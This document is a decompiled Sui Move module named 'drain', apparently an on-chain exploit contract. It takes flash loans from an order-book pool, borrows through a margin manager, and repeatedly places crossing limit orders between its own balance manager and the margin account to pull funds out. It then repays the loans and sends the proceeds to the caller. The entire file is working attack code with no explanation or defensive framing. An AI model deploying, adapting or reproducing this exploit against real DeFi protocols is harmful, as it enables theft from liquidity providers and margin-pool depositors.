module 0xe4bdaa5b0d2074532ecc56d662e02e073acca10a6a6b52ed28d2308409dfb6e5::drain {
    public fun execute<T0, T1>(arg0: &mut 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::Pool<T0, T1>, arg1: &mut 0x97d9473771b01f77b0940c589484184b49f6444627ec121314fae6a6d36fb86b::margin_registry::MarginRegistry, arg2: &mut 0x97d9473771b01f77b0940c589484184b49f6444627ec121314fae6a6d36fb86b::margin_manager::MarginManager<T0, T1>, arg3: &mut 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::balance_manager::BalanceManager, arg4: &mut 0x97d9473771b01f77b0940c589484184b49f6444627ec121314fae6a6d36fb86b::margin_pool::MarginPool<T1>, arg5: &0x8d97f1cd6ac663735be08d1d2b6d02a159e711586461306ce60a2b7a6a565a9e::price_info::PriceInfoObject, arg6: &0x8d97f1cd6ac663735be08d1d2b6d02a159e711586461306ce60a2b7a6a565a9e::price_info::PriceInfoObject, arg7: u64, arg8: u64, arg9: u64, arg10: u64, arg11: u64, arg12: &0x2::clock::Clock, arg13: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, _) = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::pool_book_params<T0, T1>(arg0);
        let (v3, _, _) = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::vault_balances<T0, T1>(arg0);
        assert!(v3 > 0, 100);
        let v6 = v3 * arg7 / 100 / v1 * v1;
        let v7 = v6 * arg8 / 100 / v1 * v1;
        let v8 = arg9 * arg10;
        let (v9, v10) = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::borrow_flashloan_base<T0, T1>(arg0, v6, arg13);
        let v11 = v9;
        let v12 = 0x2::coin::zero<T1>(arg13);
        if (v7 > 0) {
            let (v13, v14, v15) = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::swap_exact_base_for_quote<T0, T1>(arg0, 0x2::coin::split<T0>(&mut v11, v7, arg13), 0x2::coin::zero<0xdeeb7a4662eec9f2f3def03fb937a663dddaa2e215b8078a284d026b7946c270::deep::DEEP>(arg13), 0, arg12, arg13);
            0x2::coin::join<T0>(&mut v11, v13);
            0x2::coin::join<T1>(&mut v12, v14);
            0x2::transfer::public_transfer<0x2::coin::Coin<0xdeeb7a4662eec9f2f3def03fb937a663dddaa2e215b8078a284d026b7946c270::deep::DEEP>>(v15, 0x2::tx_context::sender(arg13));
        };
        if (0x2::coin::value<T1>(&v12) > 0) {
            let (v16, v17, v18) = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::swap_exact_quote_for_base<T0, T1>(arg0, v12, 0x2::coin::zero<0xdeeb7a4662eec9f2f3def03fb937a663dddaa2e215b8078a284d026b7946c270::deep::DEEP>(arg13), 0, arg12, arg13);
            0x2::coin::join<T0>(&mut v11, v16);
            v12 = v17;
            0x2::transfer::public_transfer<0x2::coin::Coin<0xdeeb7a4662eec9f2f3def03fb937a663dddaa2e215b8078a284d026b7946c270::deep::DEEP>>(v18, 0x2::tx_context::sender(arg13));
        };
        let (v19, v20) = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::borrow_flashloan_quote<T0, T1>(arg0, arg9, arg13);
        let v21 = v19;
        0x2::coin::join<T1>(&mut v21, v12);
        let (_, _, v24, _) = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::get_level2_ticks_from_mid<T0, T1>(arg0, 1, arg12);
        let v26 = v24;
        let (v27, _, _, _) = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::get_level2_ticks_from_mid<T0, T1>(arg0, 1, arg12);
        let v31 = v27;
        assert!(!0x1::vector::is_empty<u64>(&v26) && !0x1::vector::is_empty<u64>(&v31), 300);
        let v32 = (*0x1::vector::borrow<u64>(&v26, 0) - v0) / v0 * v0;
        let v33 = (*0x1::vector::borrow<u64>(&v31, 0) + v0) / v0 * v0;
        assert!(v32 > v33, 301);
        assert!(0x2::coin::value<T1>(&v21) >= arg9, 400);
        0x97d9473771b01f77b0940c589484184b49f6444627ec121314fae6a6d36fb86b::pool_proxy::update_current_price<T0, T1>(arg1, arg0, arg5, arg6, arg12);
        0x97d9473771b01f77b0940c589484184b49f6444627ec121314fae6a6d36fb86b::margin_manager::deposit<T0, T1, T1>(arg2, arg1, arg5, arg6, 0x2::coin::split<T1>(&mut v21, arg9, arg13), arg12, arg13);
        0x97d9473771b01f77b0940c589484184b49f6444627ec121314fae6a6d36fb86b::margin_manager::borrow_quote<T0, T1>(arg2, arg1, arg4, arg5, arg6, arg0, v8, arg12, arg13);
        let v34 = 0x2::coin::value<T0>(&v11);
        assert!(v34 > 0, 500);
        0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::balance_manager::deposit<T0>(arg3, v11, arg13);
        let v35 = v34 * 85 / 100 / v1 * v1;
        let v36 = v35 * 999 / 1000 / v1 * v1;
        assert!(v35 > 0 && v36 > 0, 500);
        let v37 = arg9 + v8;
        let v38 = v35 / 1000 * v32 / 1000 / 1000;
        let v39 = v36 / 1000 * v33 / 1000 / 1000;
        let v40 = if (v38 > v39) {
            v38 - v39
        } else {
            1
        };
        let v41 = if (v37 > v38) {
            (v37 - v38) / v40
        } else {
            0
        };
        let v42 = if (arg11 < v41) {
            arg11
        } else {
            v41
        };
        assert!(v42 > 0, 800);
        let v43 = 0;
        while (v43 < v42) {
            let v44 = v43 * 10;
            let v45 = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::balance_manager::generate_proof_as_owner(arg3, arg13);
            0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::place_limit_order<T0, T1>(arg0, arg3, &v45, v44, 0, 0, v32, v35, false, false, 18446744073709551615, arg12, arg13);
            0x97d9473771b01f77b0940c589484184b49f6444627ec121314fae6a6d36fb86b::pool_proxy::place_limit_order<T0, T1>(arg1, arg2, arg0, v44 + 1, 1, 0, v32, v35, true, false, 18446744073709551615, arg12, arg13);
            let v46 = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::balance_manager::generate_proof_as_owner(arg3, arg13);
            0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::cancel_all_orders<T0, T1>(arg0, arg3, &v46, arg12, arg13);
            let v47 = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::balance_manager::generate_proof_as_owner(arg3, arg13);
            0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::withdraw_settled_amounts<T0, T1>(arg0, arg3, &v47);
            assert!(0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::balance_manager::balance<T1>(arg3) > 0, 600);
            let v48 = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::balance_manager::generate_proof_as_owner(arg3, arg13);
            0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::place_limit_order<T0, T1>(arg0, arg3, &v48, v44 + 2, 0, 0, v33, v36, true, false, 18446744073709551615, arg12, arg13);
            0x97d9473771b01f77b0940c589484184b49f6444627ec121314fae6a6d36fb86b::pool_proxy::place_limit_order<T0, T1>(arg1, arg2, arg0, v44 + 3, 1, 0, v33, v36, false, false, 18446744073709551615, arg12, arg13);
            let v49 = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::balance_manager::generate_proof_as_owner(arg3, arg13);
            0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::cancel_all_orders<T0, T1>(arg0, arg3, &v49, arg12, arg13);
            let v50 = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::balance_manager::generate_proof_as_owner(arg3, arg13);
            0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::withdraw_settled_amounts<T0, T1>(arg0, arg3, &v50);
            v43 = v43 + 1;
        };
        let v51 = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::balance_manager::generate_proof_as_owner(arg3, arg13);
        0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::cancel_all_orders<T0, T1>(arg0, arg3, &v51, arg12, arg13);
        let v52 = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::balance_manager::generate_proof_as_owner(arg3, arg13);
        0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::withdraw_settled_amounts<T0, T1>(arg0, arg3, &v52);
        let v53 = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::balance_manager::withdraw_all<T0>(arg3, arg13);
        let v54 = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::balance_manager::withdraw_all<T1>(arg3, arg13);
        let v55 = 0x2::coin::value<T1>(&v54) / 50;
        if (v55 > 0) {
            let (v56, v57, v58) = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::swap_exact_quote_for_base<T0, T1>(arg0, 0x2::coin::split<T1>(&mut v54, v55, arg13), 0x2::coin::zero<0xdeeb7a4662eec9f2f3def03fb937a663dddaa2e215b8078a284d026b7946c270::deep::DEEP>(arg13), 0, arg12, arg13);
            0x2::coin::join<T0>(&mut v53, v56);
            0x2::coin::join<T1>(&mut v54, v57);
            0x2::transfer::public_transfer<0x2::coin::Coin<0xdeeb7a4662eec9f2f3def03fb937a663dddaa2e215b8078a284d026b7946c270::deep::DEEP>>(v58, 0x2::tx_context::sender(arg13));
        };
        assert!(0x2::coin::value<T0>(&v53) >= v6, 700);
        0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::return_flashloan_base<T0, T1>(arg0, 0x2::coin::split<T0>(&mut v53, v6, arg13), v10);
        0x2::coin::join<T1>(&mut v54, v21);
        assert!(0x2::coin::value<T1>(&v54) >= arg9, 701);
        0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::return_flashloan_quote<T0, T1>(arg0, 0x2::coin::split<T1>(&mut v54, arg9, arg13), v20);
        0x2::transfer::public_transfer<0x2::coin::Coin<T0>>(v53, 0x2::tx_context::sender(arg13));
        0x2::transfer::public_transfer<0x2::coin::Coin<T1>>(v54, 0x2::tx_context::sender(arg13));
    }

    // decompiled from Move bytecode v7
}

